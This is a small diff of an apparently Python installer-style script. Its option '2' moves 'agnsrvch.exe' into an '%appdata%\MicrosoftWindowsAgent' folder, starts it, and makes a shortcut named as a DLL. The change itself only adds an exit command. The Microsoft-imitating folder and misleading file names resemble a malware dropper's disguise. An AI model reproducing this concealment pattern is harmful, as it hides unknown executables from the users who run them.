@@ -60,6 +60,7 @@ elif option == '2':
     cmd(rf"move agnsrvch.exe %appdata%\MicrosoftWindowsAgent\\")
     cmd(rf"start %appdata%\MicrosoftWindowsAgent\\agnsrvch.exe")
     create_file_shortcut(f"{file_local_save}\MicrosoftWindowsAgent\\agnsrvch.exe", f"agnsrvch.dll")
+    cmd("exit")
 else:
     print(f"{wrong_value}")
     print(f"{"\n" * 35}{wrong_value}\n{version} By {color.type.Black}{color.fg.purple}EoRoferr{color.reset}")
